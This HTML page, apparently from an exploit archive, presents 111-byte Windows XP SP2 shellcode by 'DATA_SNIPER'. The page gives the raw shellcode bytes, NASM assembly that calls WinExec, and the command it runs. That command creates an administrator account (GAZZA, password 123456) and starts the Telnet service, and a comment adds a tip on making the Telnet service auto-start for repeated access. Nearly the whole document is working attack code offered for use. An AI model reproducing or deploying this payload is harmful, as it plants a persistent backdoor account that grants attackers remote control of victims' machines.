<html><head><title>Windows - telnetbind by winexec - 111 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
; payload:add admin acount &amp; Telnet Listening
; Author: DATA_SNIPER
; size:111 bytes
; platform:WIN32/XP SP2 FR
; thanks:Arab4services team &amp; AT4RE Team
; more info: visit my blog http://datasniper.arab4services.net
; The Sh3llcode:
; &quot;\xEB\x08\xBA\x4D\x11\x86\x7C\xFF\xD2\xCC\xE8\xF3\xFF\xFF\xFF\x63\x6D\x64\x20\x2F\x63&quot;
; &quot;\x20\x6E\x65\x74\x20\x75\x73\x65\x72\x20\x68\x69\x6C\x6C\x20\x31\x32\x33\x34\x35&quot;
; &quot;\x36\x20\x2F\x41\x44\x44\x20\x26\x26\x20\x6E\x65\x74\x20\x6C\x6F\x63\x61\x6C\x67&quot;
; &quot;\x72\x6F\x75\x70\x20\x41\x64\x6D\x69\x6E\x69\x73\x74\x72\x61\x74\x65\x75\x72\x73&quot;
; &quot;\x20\x68\x69\x6C\x6C\x20\x2F\x41\x44\x44\x20\x26\x26\x20\x73\x63\x20\x73\x74\x61&quot;
; &quot;\x72\x74\x20\x54\x6C\x6E\x74\x53\x76\x72\x00&quot;
; Description: it's simular to TCP BindShell on port 23,throught Command execution we can get shell access throught telnet service on Windows b0x.
; Add admin account command user=GAZZA ,pass=123456 :cmd /c net user GAZZA 123456 /ADD &amp;&amp; net localgroup Administrateurs GAZZA /ADD
; Start telnet service: sc start TlntSvr
; For saving ur access to the B0x again and again :),u can use this command:
; &quot;sc config TlntSvr start= auto &amp;  sc start TlntSvr&quot; instead of:
; &quot;sc start TlntSvr&quot;
; NASM -s -fbin telnetbind.asm
BITS 32 
db 0EBh,08h    ;such as &quot;jmp Data&quot; ,i puted it in opcode format for avoiding null problem.
Exec:
MOV EDX,7C86114Dh ;WinExec addr in WIN XP SP2 FR
CALL EDX
INT3 ;just interrupter (hung the shellcode after it do his job,any way u can use ExitProcess) for avoiding infinite loop
Data:
CALL Exec
db 'cmd /c net user GAZZA 123456 /ADD &amp; net localgroup Administrateurs GAZZA /ADD &amp; sc start TlntSvr',00h
;add user GAZA with 123456 password and start telnet service ;BTW the exstension cuted for saving som byte ;)


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
